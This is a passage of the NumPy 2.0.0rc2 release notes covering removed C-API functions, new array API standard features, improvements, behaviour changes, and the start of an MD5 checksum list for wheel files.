reflected\n  builtin numeric types and served no internal purpose.\n\n  (`gh-25149 <https://github.com/numpy/numpy/pull/25149>`__)\n\n* ``PyArray_REFCNT`` and ``NPY_REFCOUNT`` are removed. Use ``Py_REFCNT`` instead.\n\n  (`gh-25156 <https://github.com/numpy/numpy/pull/25156>`__)\n\n* ``PyArrayFlags_Type`` and ``PyArray_NewFlagsObject`` as well as\n  ``PyArrayFlagsObject`` are private now.\n  There is no known use-case; use the Python API if needed.\n\n* ``PyArray_MoveInto``, ``PyArray_CastTo``, ``PyArray_CastAnyTo`` are removed\n  use ``PyArray_CopyInto`` and if absolutely needed ``PyArray_CopyAnyInto``\n  (the latter does a flat copy).\n\n* ``PyArray_FillObjectArray`` is removed, its only true use was for\n  implementing ``np.empty``.  Create a new empty array or use\n  ``PyArray_FillWithScalar()`` (decrefs existing objects).\n\n* ``PyArray_CompareUCS4`` and ``PyArray_CompareString`` are removed.\n  Use the standard C string comparison functions.\n\n* ``PyArray_ISPYTHON`` is removed as it is misleading, has no known\n  use-cases, and is easy to replace.\n\n* ``PyArray_FieldNames`` is removed, as it is unclear what it would\n  be useful for.  It also has incorrect semantics in some possible\n  use-cases.\n\n* ``PyArray_TypestrConvert`` is removed, since it seems a misnomer and unlikely\n  to be used by anyone.  If you know the size or are limited to few types, just\n  use it explicitly, otherwise go via Python strings.\n\n  (`gh-25292 <https://github.com/numpy/numpy/pull/25292>`__)\n\n* ``PyDataType_GetDatetimeMetaData`` is removed, it did not actually\n  do anything since at least NumPy 1.7.\n\n  (`gh-25802 <https://github.com/numpy/numpy/pull/25802>`__)\n\n* ``PyArray_GetCastFunc`` is removed. Note that custom legacy user dtypes\n  can still provide a castfunc as their implementation, but any access to them\n  is now removed.  The reason for this is that NumPy never used these\n  internally for many years.  If you use simple numeric types, please just use\n  C casts directly.  In case you require an alternative, please let us know so\n  we can create new API such as ``PyArray_CastBuffer()`` which could use old or\n  new cast functions depending on the NumPy version.\n\n  (`gh-25161 <https://github.com/numpy/numpy/pull/25161>`__)\n\n\nNew Features\n============\n\n``np.add`` was extended to work with ``unicode`` and ``bytes`` dtypes.\n----------------------------------------------------------------------\n\n  (`gh-24858 <https://github.com/numpy/numpy/pull/24858>`__)\n\n\nA new ``bitwise_count`` function\n--------------------------------\nThis new function counts the number of 1-bits in a number.\n`~numpy.bitwise_count` works on all the numpy integer types and\ninteger-like objects.\n\n.. code-block:: python\n\n    >>> a = np.array([2**i - 1 for i in range(16)])\n    >>> np.bitwise_count(a)\n    array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15],\n          dtype=uint8)\n\n(`gh-19355 <https://github.com/numpy/numpy/pull/19355>`__)\n\n\nmacOS Accelerate support, including the ILP64\n---------------------------------------------\nSupport for the updated Accelerate BLAS/LAPACK library, including ILP64 (64-bit\ninteger) support, in macOS 13.3 has been added. This brings arm64 support, and\nsignificant performance improvements of up to 10x for commonly used linear\nalgebra operations. When Accelerate is selected at build time, or if no\nexplicit BLAS library selection is done, the 13.3+ version will automatically\nbe used if available.\n\n(`gh-24053 <https://github.com/numpy/numpy/pull/24053>`__)\n\nBinary wheels are also available. On macOS >=14.0, users who install NumPy from\nPyPI will get wheels built against Accelerate rather than OpenBLAS.\n\n(`gh-25255 <https://github.com/numpy/numpy/pull/25255>`__)\n\n\nOption to use weights for quantile and percentile functions\n-----------------------------------------------------------\nA ``weights`` keyword is now available for `~numpy.quantile`,\n`~numpy.percentile`, `~numpy.nanquantile` and `~numpy.nanpercentile`. Only\n``method=\"inverted_cdf\"`` supports weights.\n\n(`gh-24254 <https://github.com/numpy/numpy/pull/24254>`__)\n\n\nImproved CPU optimization tracking\n----------------------------------\nA new tracer mechanism is available which enables tracking of the enabled\ntargets for each optimized function (i.e., that uses hardware-specific SIMD\ninstructions) in the NumPy library. With this enhancement, it becomes possible\nto precisely monitor the enabled CPU dispatch targets for the dispatched\nfunctions.\n\nA new function named ``opt_func_info`` has been added to the new namespace\n`numpy.lib.introspect`, offering this tracing capability. This function allows\nyou to retrieve information about the enabled targets based on function names\nand data type signatures.\n\n(`gh-24420 <https://github.com/numpy/numpy/pull/24420>`__)\n\n\nA new Meson backend for ``f2py``\n--------------------------------\n``f2py`` in compile mode (i.e. ``f2py -c``) now accepts the ``--backend meson``\noption. This is the default option for Python >=3.12. For older Python versions,\n``f2py`` will still default to ``--backend distutils``.\n\nTo support this in realistic use-cases, in compile mode ``f2py`` takes a\n``--dep`` flag one or many times which maps to ``dependency()`` calls in the\n``meson`` backend, and does nothing in the ``distutils`` backend.\n\nThere are no changes for users of ``f2py`` only as a code generator, i.e. without ``-c``.\n\n(`gh-24532 <https://github.com/numpy/numpy/pull/24532>`__)\n\n\n``bind(c)`` support for ``f2py``\n--------------------------------\nBoth functions and subroutines can be annotated with ``bind(c)``. ``f2py`` will\nhandle both the correct type mapping, and preserve the unique label for other\nC interfaces.\n\n**Note:** ``bind(c, name = 'routine_name_other_than_fortran_routine')`` is not\nhonored by the ``f2py`` bindings by design, since ``bind(c)`` with the ``name``\nis meant to guarantee only the same name in C and Fortran, not in Python and\nFortran.\n\n(`gh-24555 <https://github.com/numpy/numpy/pull/24555>`__)\n\n\nA new ``strict`` option for several testing functions\n-----------------------------------------------------\nThe ``strict`` keyword is now available for `~numpy.testing.assert_allclose`,\n`~numpy.testing.assert_equal`, and `~numpy.testing.assert_array_less`.\nSetting ``strict=True`` will disable the broadcasting behaviour for scalars\nand ensure that input arrays have the same data type.\n\n(`gh-24680 <https://github.com/numpy/numpy/pull/24680>`__,\n`gh-24770 <https://github.com/numpy/numpy/pull/24770>`__,\n`gh-24775 <https://github.com/numpy/numpy/pull/24775>`__)\n\n\nAdd ``np.core.umath.find`` and ``np.core.umath.rfind`` UFuncs\n-------------------------------------------------------------\nAdd two ``find`` and ``rfind`` UFuncs that operate on unicode or byte strings\nand are used in ``np.char``. They operate similar to ``str.find`` and\n``str.rfind``.\n\n(`gh-24868 <https://github.com/numpy/numpy/pull/24868>`__)\n\n\n``diagonal`` and ``trace`` for ``numpy.linalg``\n-----------------------------------------------\n`numpy.linalg.diagonal` and `numpy.linalg.trace` have been\nadded, which are array API standard-compatible variants of `numpy.diagonal` and\n`numpy.trace`. They differ in the default axis selection which define 2-D\nsub-arrays.\n\n(`gh-24887 <https://github.com/numpy/numpy/pull/24887>`__)\n\n\nNew ``long`` and ``ulong`` dtypes\n---------------------------------\n`numpy.long` and `numpy.ulong` have been added as NumPy integers mapping\nto C's ``long`` and ``unsigned long``. Prior to NumPy 1.24, ``numpy.long`` was\nan alias to Python's ``int``.\n\n(`gh-24922 <https://github.com/numpy/numpy/pull/24922>`__)\n\n\n``svdvals`` for ``numpy.linalg``\n--------------------------------\n`numpy.linalg.svdvals` has been added. It computes singular values for\n(a stack of) matrices. Executing ``np.svdvals(x)`` is the same as calling\n``np.svd(x, compute_uv=False, hermitian=False)``.\nThis function is compatible with the array API standard.\n\n(`gh-24940 <https://github.com/numpy/numpy/pull/24940>`__)\n\n\nA new ``isdtype`` function\n--------------------------\n`numpy.isdtype` was added to provide a canonical way to classify NumPy's dtypes\nin compliance with the array API standard.\n\n(`gh-25054 <https://github.com/numpy/numpy/pull/25054>`__)\n\n\nA new ``astype`` function\n-------------------------\n`numpy.astype` was added to provide an array API standard-compatible\nalternative to the `numpy.ndarray.astype` method.\n\n(`gh-25079 <https://github.com/numpy/numpy/pull/25079>`__)\n\n\nArray API compatible functions' aliases\n---------------------------------------\n13 aliases for existing functions were added to improve compatibility with the array API standard:\n\n* Trigonometry: ``acos``, ``acosh``, ``asin``, ``asinh``, ``atan``, ``atanh``, ``atan2``.\n\n* Bitwise: ``bitwise_left_shift``, ``bitwise_invert``, ``bitwise_right_shift``.\n\n* Misc: ``concat``, ``permute_dims``, ``pow``.\n\n* In ``numpy.linalg``: ``tensordot``, ``matmul``.\n\n(`gh-25086 <https://github.com/numpy/numpy/pull/25086>`__)\n\n\nNew ``unique_*`` functions\n--------------------------\nThe `~numpy.unique_all`, `~numpy.unique_counts`, `~numpy.unique_inverse`,\nand `~numpy.unique_values` functions have been added. They provide\nfunctionality of `~numpy.unique` with different sets of flags. They are array API\nstandard-compatible, and because the number of arrays they return does not\ndepend on the values of input arguments, they are easier to target for JIT\ncompilation.\n\n(`gh-25088 <https://github.com/numpy/numpy/pull/25088>`__)\n\n\nMatrix transpose support for ndarrays\n-------------------------------------\nNumPy now offers support for calculating the matrix transpose of an array (or\nstack of arrays). The matrix transpose is equivalent to swapping the last two\naxes of an array. Both ``np.ndarray`` and ``np.ma.MaskedArray`` now expose a\n``.mT`` attribute, and there is a matching new `numpy.matrix_transpose`\nfunction.\n\n(`gh-23762 <https://github.com/numpy/numpy/pull/23762>`__)\n\n\nArray API compatible functions for ``numpy.linalg``\n---------------------------------------------------\nSix new functions and two aliases were added to improve compatibility with\nthe Array API standard for `numpy.linalg`:\n\n* `numpy.linalg.matrix_norm` - Computes the matrix norm of a matrix (or a stack of matrices).\n\n* `numpy.linalg.vector_norm` - Computes the vector norm of a vector (or batch of vectors).\n\n* `numpy.vecdot` - Computes the (vector) dot product of two arrays.\n\n* `numpy.linalg.vecdot` - An alias for `numpy.vecdot`.\n\n* `numpy.linalg.matrix_transpose` - An alias for `numpy.matrix_transpose`.\n\n  (`gh-25155 <https://github.com/numpy/numpy/pull/25155>`__)\n\n* `numpy.linalg.outer` has been added. It computes the outer product of two\n  vectors. It differs from `numpy.outer` by accepting one-dimensional arrays\n  only. This function is compatible with the array API standard.\n\n  (`gh-25101 <https://github.com/numpy/numpy/pull/25101>`__)\n\n* `numpy.linalg.cross` has been added. It computes the cross product of two\n  (arrays of) 3-dimensional vectors. It differs from `numpy.cross` by accepting\n  three-dimensional vectors only. This function is compatible with the array\n  API standard.\n\n  (`gh-25145 <https://github.com/numpy/numpy/pull/25145>`__)\n\n\nA ``correction`` argument for ``var`` and ``std``\n-------------------------------------------------\nA ``correction`` argument was added to `~numpy.var` and `~numpy.std`, which is\nan array API standard compatible alternative to ``ddof``. As both arguments\nserve a similar purpose, only one of them can be provided at the same time.\n\n(`gh-25169 <https://github.com/numpy/numpy/pull/25169>`__)\n\n\n``ndarray.device`` and ``ndarray.to_device``\n--------------------------------------------\nAn ``ndarray.device`` attribute and ``ndarray.to_device`` method were\nadded to ``numpy.ndarray`` for array API standard compatibility.\n\nAdditionally, ``device`` keyword-only arguments were added to:\n`~numpy.asarray`, `~numpy.arange`, `~numpy.empty`, `~numpy.empty_like`,\n`~numpy.eye`, `~numpy.full`, `~numpy.full_like`, `~numpy.linspace`,\n`~numpy.ones`, `~numpy.ones_like`, `~numpy.zeros`, and `~numpy.zeros_like`.\n\nFor all these new arguments, only ``device=\"cpu\"`` is supported.\n\n(`gh-25233 <https://github.com/numpy/numpy/pull/25233>`__)\n\n\nStringDType has been added to NumPy\n-----------------------------------\nWe have added a new variable-width UTF-8 encoded string data type, implementing\na \"NumPy array of Python strings\", including support for a user-provided missing\ndata sentinel. It is intended as a drop-in replacement for arrays of Python\nstrings and missing data sentinels using the object dtype. See `NEP 55\n<https://numpy.org/neps/nep-0055-string_dtype.html>`_ and :ref:`the\ndocumentation <stringdtype>` for more details.\n\n(`gh-25347 <https://github.com/numpy/numpy/pull/25347>`__)\n\n\nNew keywords for ``cholesky`` and ``pinv``\n------------------------------------------\nThe ``upper`` and ``rtol`` keywords were added to `numpy.linalg.cholesky` and\n`numpy.linalg.pinv`, respectively, to improve array API standard compatibility.\n\nFor `~numpy.linalg.pinv`, if neither ``rcond`` nor ``rtol`` is specified,\nthe ``rcond``'s default is used. We plan to deprecate and remove ``rcond`` in\nthe future.\n\n(`gh-25388 <https://github.com/numpy/numpy/pull/25388>`__)\n\n\nNew keywords for ``sort``, ``argsort`` and ``linalg.matrix_rank``\n-----------------------------------------------------------------\nNew keyword parameters were added to improve array API standard compatibility:\n\n* ``rtol`` was added to `~numpy.linalg.matrix_rank`.\n\n* ``stable`` was added to `~numpy.sort` and `~numpy.argsort`.\n\n(`gh-25437 <https://github.com/numpy/numpy/pull/25437>`__)\n\n\nNew ``numpy.strings`` namespace for string ufuncs\n-------------------------------------------------\nNumPy now implements some string operations as ufuncs. The old ``np.char``\nnamespace is still available, and where possible the string manipulation\nfunctions in that namespace have been updated to use the new ufuncs,\nsubstantially improving their performance.\n\nWhere possible, we suggest updating code to use functions in ``np.strings``\ninstead of ``np.char``. In the future we may deprecate ``np.char`` in favor of\n``np.strings``.\n\n(`gh-25463 <https://github.com/numpy/numpy/pull/25463>`__)\n\n\n``numpy.fft`` support for different precisions and in-place calculations\n------------------------------------------------------------------------\nThe various FFT routines in `numpy.fft` now do their calculations natively in\nfloat, double, or long double precision, depending on the input precision,\ninstead of always calculating in double precision. Hence, the calculation will\nnow be less precise for single and more precise for long double precision.\nThe data type of the output array will now be adjusted accordingly.\n\nFurthermore, all FFT routines have gained an ``out`` argument that can be used\nfor in-place calculations.\n\n(`gh-25536 <https://github.com/numpy/numpy/pull/25536>`__)\n\n\nconfigtool and pkg-config support\n---------------------------------\nA new ``numpy-config`` CLI script is available that can be queried for the\nNumPy version and for compile flags needed to use the NumPy C API. This will\nallow build systems to better support the use of NumPy as a dependency.\nAlso, a ``numpy.pc`` pkg-config file is now included with Numpy. In order to\nfind its location for use with ``PKG_CONFIG_PATH``, use\n``numpy-config --pkgconfigdir``.\n\n(`gh-25730 <https://github.com/numpy/numpy/pull/25730>`__)\n\n\nArray API standard support in the main namespace\n------------------------------------------------\nThe main ``numpy`` namespace now supports the array API standard. See\n:ref:`array-api-standard-compatibility` for details.\n\n(`gh-25911 <https://github.com/numpy/numpy/pull/25911>`__)\n\nImprovements\n============\n\nStrings are now supported by ``any``, ``all``, and the logical ufuncs.\n----------------------------------------------------------------------\n\n  (`gh-25651 <https://github.com/numpy/numpy/pull/25651>`__)\n\n\nInteger sequences as the shape argument for ``memmap``\n------------------------------------------------------\n`numpy.memmap` can now be created with any integer sequence as the ``shape``\nargument, such as a list or numpy array of integers. Previously, only the\ntypes of tuple and int could be used without raising an error.\n\n(`gh-23729 <https://github.com/numpy/numpy/pull/23729>`__)\n\n\n``errstate`` is now faster and context safe\n-------------------------------------------\nThe `numpy.errstate` context manager/decorator is now faster and\nsafer.  Previously, it was not context safe and had (rare)\nissues with thread-safety.\n\n(`gh-23936 <https://github.com/numpy/numpy/pull/23936>`__)\n\n\nAArch64 quicksort speed improved by using Highway's VQSort\n----------------------------------------------------------\nThe first introduction of the Google Highway library, using VQSort on AArch64. \nExecution time is improved by up to 16x in some cases, see the PR for benchmark\nresults. Extensions to other platforms will be done in the future.\n\n(`gh-24018 <https://github.com/numpy/numpy/pull/24018>`__)\n\n\nComplex types - underlying C type changes\n-----------------------------------------\n* The underlying C types for all of NumPy's complex types have been changed to\n  use C99 complex types.\n\n* While this change does not affect the memory layout of complex types, it\n  changes the API to be used to directly retrieve or write the real or\n  complex part of the complex number, since direct field access (as in ``c.real``\n  or ``c.imag``) is no longer an option. You can now use utilities provided in\n  ``numpy/npy_math.h`` to do these operations, like this:\n\n  .. code-block:: c\n\n      npy_cdouble c;\n      npy_csetreal(&c, 1.0);\n      npy_csetimag(&c, 0.0);\n      printf(\"%d + %di\\n\", npy_creal(c), npy_cimag(c));\n\n* To ease cross-version compatibility, equivalent macros and a compatibility\n  layer have been added which can be used by downstream packages to continue\n  to support both NumPy 1.x and 2.x. See :ref:`complex-numbers` for more info.\n\n* ``numpy/npy_common.h`` now includes ``complex.h``, which means that ``complex``\n  is now a reserved keyword.\n\n(`gh-24085 <https://github.com/numpy/numpy/pull/24085>`__)\n\n\n``iso_c_binding`` support and improved common blocks for ``f2py``\n-----------------------------------------------------------------\nPreviously, users would have to define their own custom ``f2cmap`` file to use\ntype mappings defined by the Fortran2003 ``iso_c_binding`` intrinsic module.\nThese type maps are now natively supported by ``f2py``\n\n(`gh-24555 <https://github.com/numpy/numpy/pull/24555>`__)\n\n``f2py`` now handles ``common`` blocks which have ``kind`` specifications from\nmodules. This further expands the usability of intrinsics like\n``iso_fortran_env`` and ``iso_c_binding``.\n\n(`gh-25186 <https://github.com/numpy/numpy/pull/25186>`__)\n\n\nCall ``str`` automatically on third argument to functions like ``assert_equal``\n-------------------------------------------------------------------------------\nThe third argument to functions like `~numpy.testing.assert_equal` now has\n``str`` called on it automatically. This way it mimics the built-in ``assert``\nstatement, where ``assert_equal(a, b, obj)`` works like ``assert a == b, obj``.\n\n(`gh-24877 <https://github.com/numpy/numpy/pull/24877>`__)\n\n\nSupport for array-like ``atol``/``rtol`` in ``isclose``, ``allclose``\n---------------------------------------------------------------------\nThe keywords ``atol`` and ``rtol`` in `~numpy.isclose` and `~numpy.allclose`\nnow accept both scalars and arrays. An array, if given, must broadcast\nto the shapes of the first two array arguments.\n\n(`gh-24878 <https://github.com/numpy/numpy/pull/24878>`__)\n\n\nConsistent failure messages in test functions\n---------------------------------------------\nPreviously, some `numpy.testing` assertions printed messages that\nreferred to the actual and desired results as ``x`` and ``y``.\nNow, these values are consistently referred to as ``ACTUAL`` and\n``DESIRED``.\n\n(`gh-24931 <https://github.com/numpy/numpy/pull/24931>`__)\n\n\nn-D FFT transforms allow ``s[i] == -1``\n---------------------------------------\nThe `~numpy.fft.fftn`, `~numpy.fft.ifftn`, `~numpy.fft.rfftn`,\n`~numpy.fft.irfftn`, `~numpy.fft.fft2`, `~numpy.fft.ifft2`, `~numpy.fft.rfft2`\nand `~numpy.fft.irfft2` functions now use the whole input array along the axis\n``i`` if ``s[i] == -1``, in line with the array API standard.\n\n(`gh-25495 <https://github.com/numpy/numpy/pull/25495>`__)\n\n\nGuard PyArrayScalar_VAL and PyUnicodeScalarObject for the limited API\n---------------------------------------------------------------------\n``PyUnicodeScalarObject`` holds a ``PyUnicodeObject``, which is not available\nwhen using ``Py_LIMITED_API``. Add guards to hide it and consequently also make\nthe ``PyArrayScalar_VAL`` macro hidden.\n\n(`gh-25531 <https://github.com/numpy/numpy/pull/25531>`__)\n\n\nChanges\n=======\n\n* ``np.gradient()`` now returns a tuple rather than a list making the\n  return value immutable.\n\n  (`gh-23861 <https://github.com/numpy/numpy/pull/23861>`__)\n\n* Being fully context and thread-safe, ``np.errstate`` can only\n  be entered once now.\n\n* ``np.setbufsize`` is now tied to ``np.errstate()``: leaving an\n  ``np.errstate`` context will also reset the ``bufsize``.\n\n  (`gh-23936 <https://github.com/numpy/numpy/pull/23936>`__)\n\n* A new public ``np.lib.array_utils`` submodule has been introduced and it\n  currently contains three functions: ``byte_bounds`` (moved from\n  ``np.lib.utils``), ``normalize_axis_tuple`` and ``normalize_axis_index``.\n\n  (`gh-24540 <https://github.com/numpy/numpy/pull/24540>`__)\n\n* Introduce `numpy.bool` as the new canonical name for NumPy's boolean dtype,\n  and make `numpy.bool_` an alias to it. Note that until NumPy 1.24,\n  ``np.bool`` was an alias to Python's builtin ``bool``. The new name helps\n  with array API standard compatibility and is a more intuitive name.\n\n  (`gh-25080 <https://github.com/numpy/numpy/pull/25080>`__)\n\n* The ``dtype.flags`` value was previously stored as a signed integer.\n  This means that the aligned dtype struct flag lead to negative flags being\n  set (-128 rather than 128). This flag is now stored unsigned (positive). Code\n  which checks flags manually may need to adapt.  This may include code\n  compiled with Cython 0.29.x.\n\n  (`gh-25816 <https://github.com/numpy/numpy/pull/25816>`__)\n\n\nRepresentation of NumPy scalars changed\n---------------------------------------\nAs per :ref:`NEP 51 <NEP51>`, the scalar representation has been\nupdated to include the type information to avoid confusion with\nPython scalars.\n\nScalars are now printed as ``np.float64(3.0)`` rather than just ``3.0``.\nThis may disrupt workflows that store representations of numbers\n(e.g., to files) making it harder to read them. They should be stored as\nexplicit strings, for example by using ``str()`` or ``f\"{scalar!s}\"``.\nFor the time being, affected users can use ``np.set_printoptions(legacy=\"1.25\")``\nto get the old behavior (with possibly a few exceptions).\nDocumentation of downstream projects may require larger updates,\nif code snippets are tested.  We are working on tooling for\n`doctest-plus <https://github.com/scientific-python/pytest-doctestplus/issues/107>`__\nto facilitate updates.\n\n(`gh-22449 <https://github.com/numpy/numpy/pull/22449>`__)\n\n\nTruthiness of NumPy strings changed\n-----------------------------------\nNumPy strings previously were inconsistent about how they defined\nif the string is ``True`` or ``False`` and the definition did not\nmatch the one used by Python.\nStrings are now considered ``True`` when they are non-empty and\n``False`` when they are empty.\nThis changes the following distinct cases:\n\n* Casts from string to boolean were previously roughly equivalent\n  to ``string_array.astype(np.int64).astype(bool)``, meaning that only\n  valid integers could be cast.\n  Now a string of ``\"0\"`` will be considered ``True`` since it is not empty.\n  If you need the old behavior, you may use the above step (casting\n  to integer first) or ``string_array == \"0\"`` (if the input is only ever ``0`` or ``1``).\n  To get the new result on old NumPy versions use ``string_array != \"\"``.\n* ``np.nonzero(string_array)`` previously ignored whitespace so that\n  a string only containing whitespace was considered ``False``.\n  Whitespace is now considered ``True``.\n\nThis change does not affect ``np.loadtxt``, ``np.fromstring``, or ``np.genfromtxt``.\nThe first two still use the integer definition, while ``genfromtxt`` continues to\nmatch for ``\"true\"`` (ignoring case).\nHowever, if ``np.bool_`` is used as a converter the result will change.\n\nThe change does affect ``np.fromregex`` as it uses direct assignments.\n\n(`gh-23871 <https://github.com/numpy/numpy/pull/23871>`__)\n\n\nA ``mean`` keyword was added to var and std function\n----------------------------------------------------\nOften when the standard deviation is needed the mean is also needed. The same\nholds for the variance and the mean. Until now the mean is then calculated twice,\nthe change introduced here for the `~numpy.var` and `~numpy.std` functions\nallows for passing in a precalculated mean as an keyword argument. See the\ndocstrings for details and an example illustrating the speed-up.\n\n(`gh-24126 <https://github.com/numpy/numpy/pull/24126>`__)\n\n\nRemove datetime64 deprecation warning when constructing with timezone\n---------------------------------------------------------------------\nThe `numpy.datetime64` method now issues a UserWarning rather than a\nDeprecationWarning whenever a timezone is included in the datetime\nstring that is provided.\n\n(`gh-24193 <https://github.com/numpy/numpy/pull/24193>`__)\n\n\nDefault integer dtype is now 64-bit on 64-bit Windows\n-----------------------------------------------------\nThe default NumPy integer is now 64-bit on all 64-bit systems as the historic\n32-bit default on Windows was a common source of issues. Most users should not\nnotice this. The main issues may occur with code interfacing with libraries\nwritten in a compiled language like C.  For more information see\n:ref:`migration_windows_int64`.\n\n(`gh-24224 <https://github.com/numpy/numpy/pull/24224>`__)\n\n\nRenamed ``numpy.core`` to ``numpy._core``\n-----------------------------------------\nAccessing ``numpy.core`` now emits a DeprecationWarning. In practice\nwe have found that most downstream usage of ``numpy.core`` was to access\nfunctionality that is available in the main ``numpy`` namespace.\nIf for some reason you are using functionality in ``numpy.core`` that\nis not available in the main ``numpy`` namespace, this means you are likely\nusing private NumPy internals. You can still access these internals via\n``numpy._core`` without a deprecation warning but we do not provide any\nbackward compatibility guarantees for NumPy internals. Please open an issue\nif you think a mistake was made and something needs to be made public.\n\n(`gh-24634 <https://github.com/numpy/numpy/pull/24634>`__)\n\nThe \"relaxed strides\" debug build option, which was previously enabled through\nthe ``NPY_RELAXED_STRIDES_DEBUG`` environment variable or the\n``-Drelaxed-strides-debug`` config-settings flag has been removed.\n\n(`gh-24717 <https://github.com/numpy/numpy/pull/24717>`__)\n\n\nRedefinition of ``np.intp``/``np.uintp`` (almost never a change)\n----------------------------------------------------------------\nDue to the actual use of these types almost always matching the use of\n``size_t``/``Py_ssize_t`` this is now the definition in C.\nPreviously, it matched ``intptr_t`` and ``uintptr_t`` which would often\nhave been subtly incorrect.\nThis has no effect on the vast majority of machines since the size\nof these types only differ on extremely niche platforms.\n\nHowever, it means that:\n\n* Pointers may not necessarily fit into an ``intp`` typed array anymore.\n  The ``p`` and ``P`` character codes can still be used, however.\n* Creating ``intptr_t`` or ``uintptr_t`` typed arrays in C remains possible\n  in a cross-platform way via ``PyArray_DescrFromType('p')``.\n* The new character codes ``nN`` were introduced.\n* It is now correct to use the Python C-API functions when parsing\n  to ``npy_intp`` typed arguments.\n\n(`gh-24888 <https://github.com/numpy/numpy/pull/24888>`__)\n\n\n``numpy.fft.helper`` made private\n---------------------------------\n``numpy.fft.helper`` was renamed to ``numpy.fft._helper`` to indicate\nthat it is a private submodule. All public functions exported by it\nshould be accessed from `numpy.fft`.\n\n(`gh-24945 <https://github.com/numpy/numpy/pull/24945>`__)\n\n\n``numpy.linalg.linalg`` made private\n------------------------------------\n``numpy.linalg.linalg`` was renamed to ``numpy.linalg._linalg``\nto indicate that it is a private submodule. All public functions\nexported by it should be accessed from `numpy.linalg`.\n\n(`gh-24946 <https://github.com/numpy/numpy/pull/24946>`__)\n\n\nOut-of-bound axis not the same as ``axis=None``\n-----------------------------------------------\nIn some cases ``axis=32`` or for concatenate any large value\nwas the same as ``axis=None``.\nExcept for ``concatenate`` this was deprecate.\nAny out of bound axis value will now error, make sure to use\n``axis=None``.\n\n(`gh-25149 <https://github.com/numpy/numpy/pull/25149>`__)\n\n.. _copy-keyword-changes-2.0:\n\n\nNew ``copy`` keyword meaning for ``array`` and ``asarray`` constructors\n-----------------------------------------------------------------------\nNow `numpy.array` and `numpy.asarray` support three values for ``copy`` parameter:\n\n* ``None`` - A copy will only be made if it is necessary.\n* ``True`` - Always make a copy.\n* ``False`` - Never make a copy. If a copy is required a ``ValueError`` is raised.\n\nThe meaning of ``False`` changed as it now raises an exception if a copy is needed.\n\n(`gh-25168 <https://github.com/numpy/numpy/pull/25168>`__)\n\n\nThe ``__array__`` special method now takes a ``copy`` keyword argument.\n-----------------------------------------------------------------------\nNumPy will pass ``copy`` to the ``__array__`` special method in situations where\nit would be set to a non-default value (e.g. in a call to\n``np.asarray(some_object, copy=False)``). Currently, if an\nunexpected keyword argument error is raised after this, NumPy will print a\nwarning and re-try without the ``copy`` keyword argument. Implementations of\nobjects implementing the ``__array__`` protocol should accept a ``copy`` keyword\nargument with the same meaning as when passed to `numpy.array` or\n`numpy.asarray`.\n\n(`gh-25168 <https://github.com/numpy/numpy/pull/25168>`__)\n\n\nCleanup of initialization of ``numpy.dtype`` with strings with commas\n---------------------------------------------------------------------\nThe interpretation of strings with commas is changed slightly, in that a\ntrailing comma will now always create a structured dtype.  E.g., where\npreviously ``np.dtype(\"i\")`` and ``np.dtype(\"i,\")`` were treated as identical,\nnow ``np.dtype(\"i,\")`` will create a structured dtype, with a single\nfield. This is analogous to ``np.dtype(\"i,i\")`` creating a structured dtype\nwith two fields, and makes the behaviour consistent with that expected of\ntuples.\n\nAt the same time, the use of single number surrounded by parenthesis to\nindicate a sub-array shape, like in ``np.dtype(\"(2)i,\")``, is deprecated.\nInstead; one should use ``np.dtype(\"(2,)i\")`` or ``np.dtype(\"2i\")``.\nEventually, using a number in parentheses will raise an exception, like is the\ncase for initializations without a comma, like ``np.dtype(\"(2)i\")``.\n\n(`gh-25434 <https://github.com/numpy/numpy/pull/25434>`__)\n\n\nChange in how complex sign is calculated\n----------------------------------------\nFollowing the array API standard, the complex sign is now calculated as\n``z / |z|`` (instead of the rather less logical case where the sign of\nthe real part was taken, unless the real part was zero, in which case\nthe sign of the imaginary part was returned).  Like for real numbers,\nzero is returned if ``z==0``.\n\n(`gh-25441 <https://github.com/numpy/numpy/pull/25441>`__)\n\n\nReturn types of functions that returned a list of arrays\n--------------------------------------------------------\nFunctions that returned a list of ndarrays have been changed to return a tuple\nof ndarrays instead. Returning tuples consistently whenever a sequence of\narrays is returned makes it easier for JIT compilers like Numba, as well as for\nstatic type checkers in some cases, to support these functions. Changed\nfunctions are: `~numpy.atleast_1d`, `~numpy.atleast_2d`, `~numpy.atleast_3d`,\n`~numpy.broadcast_arrays`, `~numpy.meshgrid`, `~numpy.ogrid`,\n`~numpy.histogramdd`.\n\n\n``np.unique`` ``return_inverse`` shape for multi-dimensional inputs\n-------------------------------------------------------------------\nWhen multi-dimensional inputs are passed to ``np.unique`` with ``return_inverse=True``,\nthe ``unique_inverse`` output is now shaped such that the input can be reconstructed\ndirectly using ``np.take(unique, unique_inverse)`` when ``axis=None``, and\n``np.take_along_axis(unique, unique_inverse, axis=axis)`` otherwise.\n\n(`gh-25553 <https://github.com/numpy/numpy/pull/25553>`__,\n`gh-25570 <https://github.com/numpy/numpy/pull/25570>`__)\n\n\n``any`` and ``all`` return booleans for object arrays\n-----------------------------------------------------\nThe ``any`` and ``all`` functions and methods now return\nbooleans also for object arrays.  Previously, they did\na reduction which behaved like the Python ``or`` and\n``and`` operators which evaluates to one of the arguments.\nYou can use ``np.logical_or.reduce`` and ``np.logical_and.reduce``\nto achieve the previous behavior.\n\n(`gh-25712 <https://github.com/numpy/numpy/pull/25712>`__)\n\n``np.can_cast`` cannot be called on Python int, float, or complex\n-----------------------------------------------------------------\n``np.can_cast`` cannot be called with Python int, float, or complex instances\nanymore.  This is because NEP 50 means that the result of ``can_cast`` must\nnot depend on the value passed in.\nUnfortunately, for Python scalars whether a cast should be considered\n``\"same_kind\"`` or ``\"safe\"`` may depend on the context and value so that\nthis is currently not implemented.\nIn some cases, this means you may have to add a specific path for:\n``if type(obj) in (int, float, complex): ...``.\n\n(`gh-26393 <https://github.com/numpy/numpy/pull/26393>`__)\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    68918d8a47bdb8032d3c29ba0b7aa922  numpy-2.0.0rc2-cp310-cp310-macosx_10_9_x86_64.whl\n    28ef21e0db45a843901d5ecb203004f3  numpy-2.0.0rc2-cp310-cp310-macosx_11_0_arm64.whl\n    b0fbed65410612a81da2610887fcce7a  numpy-2.0.0rc2-cp310-cp310-macosx_14_0_arm64.whl\n    0e263a8bb87d32496e6de1555b6de0d7  numpy-2.0.0rc2-cp310-cp310-macosx_14_0_x86_64.whl\n    3700463b63c17514a42540f75f97e109  